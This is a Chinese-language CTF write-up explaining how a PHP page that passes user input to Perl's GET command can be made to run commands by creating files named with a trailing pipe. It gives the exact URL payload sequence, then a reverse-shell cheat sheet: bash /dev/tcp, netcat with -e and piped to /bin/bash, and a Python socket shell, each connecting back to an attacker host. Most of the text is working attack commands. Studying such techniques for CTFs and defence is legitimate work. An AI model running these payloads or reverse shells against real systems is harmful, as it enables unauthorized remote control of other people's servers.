---
title: GET命令漏洞
date: 2018-09-30 17:26:17
categories: ctf
---

# 0x00 题目描述

php的 `shell_exec` 执行了 `GET` 命令。   
GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求

```php
<?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($sandbox); 
    @chdir($sandbox); 

    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
    $info = pathinfo($_GET["filename"]); 
    $dir  = str_replace(".", "", basename($info["dirname"])); 
    @mkdir($dir); 
    @chdir($dir); 
    @file_put_contents(basename($info["basename"]), $data); 
    highlight_file(__FILE__);
```

# 0x01 分析
最主要就是`$data = shell_exec("GET " . escapeshellarg($_GET["url"]));`

漏洞在于 GET 可以执行命令。
```bash
touch 'ls|' # 此命令我只在vps上执行成功。而 kali和ubuntu18创建后的内容均不可以。
```
vps:  
![image](CC1DB461E0374CD282ADDED8FF873BBF)
ubuntu与kali(多了2个单引号):  
![image](15AEAB38D73045658EB89AD598F4F116)  
当创建好文件后，使用如下命令就可以执行。  
```bash
GET 'file:ls|'
```
![image](2CD36734625743E29B20B19A247196C4)  
而刚才多了单引号的则不可以。
![image](FEC1A9D0DC854EBCB410C2DC8A6322C2)  

# 0x02 解决
所以需要在服务端的执行一个bash脚本用来反弹shell。  
在服务端的执行
```bash
GET 'file:bash a|'
```
所以需要在服务器创建**2**个文件。一个名字是`bash a|`，另一个是`a|`。其中`a|`中是要执行的脚本。  

**payload**为：
```bash
?url=http://yourvps/a.txt&filename=a
?url=&filename=bash a|
?url=file:bash a|&filename=xxx
```

**a.txt**的内容是：
```bash
bash -i >& /dev/tcp/your_vps/port 0<&1 2>&1
```

# 0x03 反弹脚本

## bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
`bash -i`是打开一个交互的bash.  
`/dev/tcp/`是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在`/dev/udp/`  

要想了解`>&`和`0>&1`，首先我们要先了解一下Linux文件描述符和重定向。   
`>&`或者`&>`将错误和输出均重定向。  


## NetCat
如果目标主机支持“-e”选项的话，我们就可以直接用
```bash
nc -e /bin/bash 10.42.0.1 1234
```
否则，现在自己的vps上监听两个端口：  
```bash
nc -l -p 1234 -vv
nc -l -p 4321 -vv
```
然后在目标主机上执行以下命令： 
```bash
nc  10.42.0.1 1234  |  /bin/bash  |  nc 10.42.0.1 4321
```
## python
```bash
python -c" 
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.42.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);"
```

